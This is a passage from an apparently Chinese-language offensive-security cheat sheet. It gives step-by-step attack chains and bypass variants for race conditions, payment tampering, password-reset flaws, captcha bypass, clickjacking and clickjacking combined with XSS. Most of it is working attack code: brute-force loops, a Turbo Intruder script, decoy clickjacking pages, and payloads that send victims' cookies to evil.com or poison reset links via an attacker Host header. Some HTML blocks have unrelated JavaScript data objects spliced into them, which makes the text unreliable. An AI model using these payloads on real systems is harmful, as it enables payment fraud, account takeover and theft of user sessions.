    async with aiohttp.ClientSession() as session:
        tasks = [race_request(session, url, headers, data) for _ in range(50)]
        results = await asyncio.gather(*tasks)
        success = sum(1 for r in results if r.get("code") == 200)
        print(f"Total: {len(results)}, Success: {success}")

asyncio.run(main())
```

**3. 3. Burp Turbo Intruder测试**
_Burp Turbo Intruder的gate机制确保所有请求同时发出_
```
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=100,
                           pipeline=True)
    for i in range(50):
        engine.queue(target.req, gate="race1")
    engine.openGate("race1")

def handleResponse(req, interesting):
    if "success" in req.response:
        table.add(req)
```

**4. 4. 验证竞态成功**
_查询账户资源确认竞态条件是否成功利用_
```
# 检查资源是否被多次消耗
GET /api/user/coupons HTTP/1.1
Host: {TARGET}
Authorization: Bearer {TOKEN}

# 预期：限领1张优惠券实际领到多张
# 检查余额变化
GET /api/user/balance HTTP/1.1
```

**WAF/EDR 绕过变体：**

**1. HTTP/2单连接并发**
_HTTP/2多路复用在单TCP连接中发送多个并发请求，绕过基于连接数的限制_
```
# HTTP/2 multiplexing同一连接并发
curl --http2 --parallel --parallel-max 50 \
  -H "Authorization: Bearer {TOKEN}" \
  -X POST "https://{TARGET}/api/coupon/claim" \
  -d '{"coupon_id":"C001"}' \
  --next --http2 --parallel ...
```

---

### 支付逻辑篡改  `biz-payment-tamper`
通过修改支付请求中的金额、数量、折扣等参数来操纵交易逻辑。常见于电商平台和在线支付系统中，可导致0元购、负价格、折扣叠加等严重业务风险。
子类：**支付安全** · tags: `支付` `金额篡改` `业务逻辑` `0元购` `电商安全`

**前置条件：** 目标存在支付/下单功能；可拦截和修改HTTP请求

**攻击链：**

**1. 1. 金额篡改测试**
_修改订单请求中的价格字段，测试后端是否校验金额_
```
POST /api/order/create HTTP/1.1
Host: {TARGET}
Content-Type: application/json
Authorization: Bearer {TOKEN}

# 原始请求
{"product_id": "P001", "quantity": 1, "price": 9900}

# 篡改为1分钱
{"product_id": "P001", "quantity": 1, "price": 1}

# 篡改为0元
{"product_id": "P001", "quantity": 1, "price": 0}

# 负数金额（退款到账）
{"product_id": "P001", "quantity": 1, "price": -100}
```

**2. 2. 数量与运费篡改**
_测试数量边界值、运费篡改和折扣溢出_
```
# 数量为0或负数
{"product_id": "P001", "quantity": 0, "price": 9900}
{"product_id": "P001", "quantity": -1, "price": 9900}

# 修改运费
{"product_id": "P001", "quantity": 1, "shipping_fee": -500}

# 超大折扣
{"product_id": "P001", "quantity": 1, "discount": 9999}
```

**3. 3. 优惠券叠加与替换**
_测试优惠券是否可叠加使用或替换为高面额券_
```
# 叠加使用多张优惠券
{"product_id": "P001", "coupons": ["C001", "C002", "C003"]}

# 替换高额优惠券ID
{"product_id": "P001", "coupon_id": "INTERNAL_VIP_100OFF"}

# 修改优惠金额字段
{"product_id": "P001", "coupon_discount": 9900}
```

**4. 4. 支付回调篡改**
_伪造支付平台回调通知，篡改支付状态和金额_
```
# 模拟支付成功回调
POST /api/payment/callback HTTP/1.1
Host: {TARGET}
Content-Type: application/x-www-form-urlencoded

order_id=ORD20240001&status=SUCCESS&amount=1&sign=tampered_sign

# 修改回调中的金额
order_id=ORD20240001&status=SUCCESS&amount=1&trade_no=FAKE123456
```

**WAF/EDR 绕过变体：**

**1. 科学计数法绕过**
_利用科学计数法、浮点精度、类型混淆绕过金额校验_
```
# 科学计数法
{"price": 1e-10}
# 浮点精度
{"price": 0.000000001}
# 字符串类型混淆
{"price": "0.01"}
# Unicode数字
{"price": "\uff10"}
```

---

### 密码重置逻辑缺陷  `biz-password-reset`
密码重置流程中的逻辑漏洞，包括重置令牌泄露、验证码爆破、响应操纵、Host头注入等攻击手法，可实现任意用户密码重置。
子类：**认证缺陷** · tags: `密码重置` `认证绕过` `业务逻辑` `验证码` `Host注入`

**前置条件：** 目标存在密码重置/找回功能；可拦截HTTP请求

**攻击链：**

**1. 1. Host头注入窃取重置链接**
_修改Host头使重置邮件中的链接指向攻击者服务器，窃取重置token_
```
POST /api/password/reset HTTP/1.1
Host: evil-server.com
X-Forwarded-Host: evil-server.com
Content-Type: application/json

{"email": "victim@target.com"}

# 受害者收到的重置链接变为：
# https://evil-server.com/reset?token=abc123
```

**2. 2. 验证码爆破**
_暴力破解4-6位验证码，测试是否有频率限制_
```
# 4位验证码爆破
for code in $(seq -w 0000 9999); do
  response=$(curl -s -X POST "https://{TARGET}/api/verify-code" \
    -H "Content-Type: application/json" \
    -d "{\"phone\":\"13800138000\",\"code\":\"$code\"}")
  if echo "$response" | grep -q "success"; then
    echo "[+] Code found: $code"
    break
  fi
done
```

**3. 3. 响应操纵绕过**
_拦截并修改服务端响应，前端可能仅依赖响应状态判断_
```
# 原始失败响应
{"code": 400, "message": "验证码错误"}

# 拦截并修改为成功
{"code": 200, "message": "验证成功", "token": "reset_token_here"}

# 某些前端仅检查code字段就放行后续操作
```

**4. 4. 重置令牌弱随机性**
_分析重置令牌的生成算法，检查是否基于可预测因素_
```
# 收集多个重置令牌分析规律
token1: 1707811200_user1  (时间戳+用户名)
token2: 1707811260_user2

# 可预测的token生成
import hashlib
token = hashlib.md5(f"{timestamp}_{email}".encode()).hexdigest()

# 使用已知信息构造重置token
predicted = hashlib.md5(b"1707811200_victim@target.com").hexdigest()
```

**WAF/EDR 绕过变体：**

**1. 多Host头绕过**
_使用多种HTTP头注入方式尝试覆盖重置链接中的域名_
```
# 双Host头
Host: target.com
Host: evil.com

# 绝对URL覆盖
POST https://evil.com/api/password/reset HTTP/1.1
Host: target.com

# X-Forwarded系列
X-Forwarded-Host: evil.com
X-Forwarded-Server: evil.com
X-Original-URL: https://evil.com/reset
```

---

### 验证码绕过技术  `biz-captcha-bypass`
绕过图形验证码、短信验证码、滑动验证等人机验证机制的各种技术手法，包括响应泄露、复用攻击、OCR识别、逻辑缺陷利用等。
子类：**验证码安全** · tags: `验证码` `CAPTCHA` `绕过` `短信验证码` `人机验证`

**前置条件：** 目标存在验证码保护的功能；Python环境

**攻击链：**

**1. 1. 验证码响应泄露**
_检查响应body、header、cookie中是否泄露验证码明文或编码值_
```
# 检查响应中是否包含验证码
POST /api/send-sms HTTP/1.1
Host: {TARGET}
Content-Type: application/json

{"phone": "13800138000"}

# 响应可能泄露
{"code": 200, "captcha": "8462", "message": "发送成功"}
# 或在响应头中
X-Captcha-Code: 8462
Set-Cookie: captcha=ODQ2Mg==  (base64 of 8462)
```

**2. 2. 验证码复用攻击**
_验证码使用后未失效，同一验证码可反复使用_
```
# 步骤1: 正常获取并输入正确验证码
POST /api/login
{"username": "test", "password": "test123", "captcha": "8462", "captcha_id": "abc"}

# 步骤2: 使用相同captcha_id和验证码反复尝试
POST /api/login
{"username": "admin", "password": "admin123", "captcha": "8462", "captcha_id": "abc"}

# 如果验证码未在使用后失效，可以一直复用
```

**3. 3. 删除验证码参数**
_测试不传、空传、null传验证码参数时后端是否仍然校验_
```
# 原始请求（包含验证码）
POST /api/login HTTP/1.1
{"username": "admin", "password": "pass", "captcha": "1234"}

# 删除验证码字段
POST /api/login HTTP/1.1
{"username": "admin", "password": "pass"}

# 空值测试
{"username": "admin", "password": "pass", "captcha": ""}
{"username": "admin", "password": "pass", "captcha": null}
```

**4. 4. 万能验证码**
_测试开发者遗留的万能验证码或调试后门_
```
# 常见万能/调试验证码
0000
1111
1234
8888
9999
6666
000000
123456

# 测试接口调试后门
{"phone": "13800138000", "code": "000000", "debug": true}
{"phone": "13800138000", "code": "master_code"}
```

**WAF/EDR 绕过变体：**

**1. OCR自动识别图形验证码**
_使用ddddocr库自动识别图形验证码集成到爆破流程_
```
import ddddocr
import requests

ocr = ddddocr.DdddOcr()

def solve_captcha(target):
    # 获取验证码图片
    resp = requests.get(f"https://{target}/captcha/image")
    code = ocr.classification(resp.content)
    return code

# 集成到爆破脚本中
for pwd in passwords:
    captcha = solve_captcha("{TARGET}")
    r = requests.post(f"https://{TARGET}/api/login",
        json={"user":"admin","pass":pwd,"captcha":captcha})
    if "success" in r.text:
        print(f"[+] Password: {pwd}")
```

---

### · 点击劫持

### 基础点击劫持  `clickjacking-basic`
通过透明iframe覆盖诱使用户在不知情的情况下点击隐藏的恶意按钮或链接
子类：**基础** · tags: `clickjacking` `ui-redressing` `iframe`

**前置条件：** 目标站点允许被iframe嵌套；目标未设置X-Frame-Options响应头；目标未配置CSP frame-ancestors策略；HTML/CSS基础知识

**攻击链：**

**1. 检测X-Frame-Options和CSP**  _[linux]_
_检查目标是否设置了防点击劫持的安全头_
```
curl -sI "http://target.com" | grep -iE "x-frame-options|content-security-policy|frame-ancestors"

# 批量检测:
for url in $(cat urls.txt); do
  echo -n "$url: "
  xfo=$(curl -sI "$url" | grep -i "x-frame-options")
  csp=$(curl -sI "$url" | grep -i "frame-ancestors")
  [ -z "$xfo" ] && [ -z "$csp" ] && echo "VULNERABLE" || echo "Protected: $xfo $csp"
done
```

**2. 基础透明iframe覆盖POC**
_构造诱饵页面，将目标敏感操作页面以透明iframe覆盖在诱饵按钮上方_
```
<html>
<head><title>Win a Prize!</title>
<style>
  #target-frame {
    position: absolute; top: 0; left: 0;
    width: 500px; height: 500px;
    opacity: 0.0001; /* 近乎完全透明 */
    z-index: 2; border: none;
  }
  #decoy-btn {
    position: absolute; top: 120px; left: 50px;
    z-index: 1; padding: 15px 30px;
    font-size: 20px; cursor: pointer;
    background: #4CAF50; color: white;
    border: none; border-radius: 5px;
  }
</style></head>
<body>
  <h1>Congratulations! You Won!</h1>
  <p>Click the button to claim your prize:</p>
  <button id="decoy-btn">Claim Prize</button>
  <iframe id="target-frame" src="http://target.com/account/delete"></iframe>
</body></html>
```

**3. 多步骤拖拽劫持(Drag-and-Drop)**
_利用HTML5拖拽API实现跨域数据提取型点击劫持_
```
<html>
<head><style>
  #source { width:200px; height:50px; background:#eee; text-align:center; line-height:50px; }
  #target-frame { position:absolute; top:0; left:0; width:600px; height:400px; opacity:0.0001; z-index:10; }
</style>
<script>
  // 监听拖拽事件，可以跨域提取数据
  document.addEventListener("drag", function(e) {
    console.log("Dragging:", e.dataTransfer.getData("text"));
  });
</script></head>
<body>
  <div id="source" draggable="true">Drag this to win!</div>
  <div id="drop-zone" style="width:200px;height:200px;border:2px dashed #ccc;margin-top:20px;">Drop Here</div>
  <iframe id="target-frame" src="http://target.com/profile" sandbox="allow-scripts allow-forms"></iframe>
</body></html>
```

**4. 利用CSS pointer-events绕过**
_使用pointer-events:none使覆盖层不拦截点击，点击直接穿透到下层iframe_
```
<style>
  .overlay { pointer-events: none; position: absolute; z-index: 100; }
  iframe { pointer-events: auto; position: absolute; opacity: 0; }
</style>
<div class="overlay">
  <h1>Survey: Rate Our Service</h1>
  <p>Select your rating below:</p>
  <!-- 诱饵内容完全不拦截鼠标事件 -->
  <div style="display:flex; gap:20px; margin-top:50px;">
    <span style="font-size:40px">⭐</span>
    <span style="font-size:40px">⭐⭐</span>
    <span style="font-size:40px">⭐⭐⭐</span>
  </div>
</div>
<iframe src="http://target.com/admin/grant-role?role=admin&user=attacker" style="width:100%;height:100%;border:none;"></iframe>
```

**WAF/EDR 绕过变体：**

**1. iframe sandbox属性绕过**
_通过iframe sandbox属性的allow-top-navigation和allow-scripts组合绕过部分frame-busting脚本_
```
<iframe src="https://target.com" sandbox="allow-scripts allow-forms allow-same-origin"></iframe>

<!-- 利用sandbox allow-top-navigation绕过 -->
<iframe src="https://target.com" sandbox="allow-scripts allow-top-navigation allow-forms"></iframe>

<!-- 利用sandbox+srcdoc绕过 -->
<iframe srcdoc="<script>top.location='https://target.com'</script>" sandbox="allow-scripts allow-top-navigation"></iframe>
```

**2. X-Frame-Options ALLOW-FROM不一致**
_X-Frame-Options ALLOW-FROM在不同浏览器中表现不一致，Chrome/Safari完全忽略此指令_
```
<!-- 利用浏览器对ALLOW-FROM支持不一致 -->
<!-- Chrome/Safari忽略ALLOW-FROM，仅CSP frame-ancestors生效 -->

<!-- 双重iframe绕过frame-busting -->
<iframe src="data:text/html,<iframe src='https://target.com'></iframe>"></iframe>

<!-- 利用window.name绕过 -->
<iframe src="attacker-page.html" name="payload_data"></iframe>
```

**3. 双重嵌套iframe绕过**
_通过双重嵌套iframe使frame-busting脚本中的top引用指向中间页而非攻击页_
```
<!-- 双重嵌套绕过frame-busting -->
<iframe src="middle-page.html"></iframe>

<!-- middle-page.html内容 -->
<html><body>,
          syntaxBreakdown: [
            { part: '<script>', explanation: { zh: '脚本标签', en: 'Scripttag' }, type: 'tag' },
            { part: '<iframe>', explanation: { zh: '内嵌框架', en: 'Inline frame (iframe)' }, type: 'tag' }
          ]
<iframe src="https://target.com" sandbox="allow-forms"></iframe>
</body></html>

<!-- onbeforeunload阻止跳转 -->
<script>window.onbeforeunload=function(){return "x";}</script>
<iframe src="https://target.com"></iframe>
```

---

### 点击劫持+XSS  `clickjacking-xss`
将点击劫持与XSS攻击结合，先通过点击劫持触发XSS攻击向量获取更深层的控制
子类：**XSS** · tags: `clickjacking` `xss`

**前置条件：** 目标存在XSS漏洞；目标允许被iframe嵌套；XSS payload可被点击触发

**攻击链：**

**1. 识别可利用的XSS和Clickjacking组合**
_同时检测目标的点击劫持和XSS漏洞_
```
# 1. 检测iframe嵌套防护
curl -sI "http://target.com" | grep -i "x-frame-options|frame-ancestors"

# 2. 检测已知XSS点
curl -s "http://target.com/search?q=<script>alert(1)</script>" | grep -i "script"

# 3. 检测Self-XSS (需要用户交互)
curl -s "http://target.com/profile/edit" -d "bio=<img+src=x+onerror=alert(document.cookie)>"
```

**2. Self-XSS + Clickjacking组合利用**
_利用多步骤点击劫持触发Self-XSS——先引导用户点击编辑按钮，再诱导粘贴XSS payload_
```
<html><head>
<style>
  iframe { position:absolute; top:0; left:0; width:800px; height:600px; opacity:0.0001; z-index:10; }
  .step { position:absolute; z-index:1; }
</style>
<script>
var step = 0;
function nextStep() {
  step++;
  if (step === 1) {
    // 第一步：诱导用户点击"个人资料编辑"按钮
    document.getElementById("msg").innerText = "Step 1: Click to claim reward!";
  } else if (step === 2) {
    // 第二步：诱导用户点击输入框
    document.getElementById("msg").innerText = "Step 2: Click to verify identity!";
  } else if (step === 3) {
    // 第三步：诱导粘贴(Ctrl+V)，执行XSS
    document.getElementById("msg").innerText = "Step 3: Press Ctrl+V to paste verification code!";
    navigator.clipboard.writeText('<img src=x onerror="fetch('https://evil.com/steal?'+document.cookie)">');
  }
}
</script></head>
<body onload="nextStep()">
  <h1 id="msg">Loading prize...</h1>
  <button class="step" onclick="nextStep()" style="top:200px;left:100px;">Next Step</button>
  <iframe src="http://target.com/profile/edit"></iframe>
</body></html>
```

**3. 反射型XSS + iframe嵌套利用**
_将含有XSS payload的URL通过iframe加载，利用点击劫持触发需要用户交互的XSS_
```
<html><head>
<style>
  iframe { width:100%; height:100%; position:absolute; top:0; left:0; opacity:0; border:none; }
</style></head>
<body>
  <h1>Free WiFi Login</h1>
  <p>Please click "Connect" to access free WiFi</p>
  <button style="padding:15px 40px; font-size:18px; margin-top:20px;">Connect</button>
  <!-- iframe加载含XSS的URL，按钮位置精确对齐触发XSS -->
  <iframe src="http://target.com/page?callback=<script>document.location='https://evil.com/steal?c='+document.cookie</script>"></iframe>
</body></html>
```

**WAF/EDR 绕过变体：**

**1. CSP frame-ancestors绕过**
_利用data:/blob: URI和srcdoc属性绕过CSP中frame-ancestors指令对iframe内容的限制_
```
<!-- 利用data: URI绕过CSP（旧浏览器） -->
<iframe src="data:text/html,<script>alert(document.domain)</script>"></iframe>

<!-- blob: URI绕过 -->
<script>
var blob = new Blob(['<script>alert(1)<\/script>'], {type: 'text/html'});
document.getElementById('frame').src = URL.createObjectURL(blob);
</script>

<!-- srcdoc属性绕过 -->
<iframe srcdoc="<script>alert(document.domain)</script>"></iframe>
```

**2. sandbox属性配置错误利用**
_利用sandbox属性中allow-scripts与allow-same-origin组合或allow-popups-to-escape-sandbox逃逸沙箱_
```
<!-- sandbox allow-scripts允许执行JS -->
<iframe src="https://target.com" sandbox="allow-scripts allow-same-origin">
</iframe>,
          syntaxBreakdown: [
            { part: '<script>', explanation: { zh: '脚本标签', en: 'Scripttag' }, type: 'tag' },
            { part: '<iframe>', explanation: { zh: '内嵌框架', en: 'Inline frame (iframe)' }, type: 'tag' },
            { part: 'alert()', explanation: { zh: '弹窗函数', en: 'Alert function' }, type: 'function' }
          ]

<!-- 利用allow-popups逃逸 -->
<iframe src="https://target.com" sandbox="allow-scripts allow-popups allow-popups-to-escape-sandbox">
</iframe>

<!-- allow-top-navigation + 点击劫持 -->
<iframe src="https://target.com" sandbox="allow-scripts allow-top-navigation-by-user-activation">
</iframe>
```

**3. 拖放劫持注入XSS**
_通过HTML5拖放API将XSS payload从攻击页面拖入目标iframe中的可编辑区域_
```
<!-- 拖放劫持将XSS payload注入目标页面 -->
<style>
#drag { position: absolute; z-index: 1; opacity: 0; }
#target { position: absolute; z-index: 0; }
</style>

<div id="drag" draggable="true"
  ondragstart="event.dataTransfer.setData('text/html','<img src=x onerror=alert(1)>')">
  Drag me
</div>

<iframe id="target" src="https://target.com/page-with-editable-field"
  sandbox="allow-scripts allow-same-origin">
</iframe>
```

---
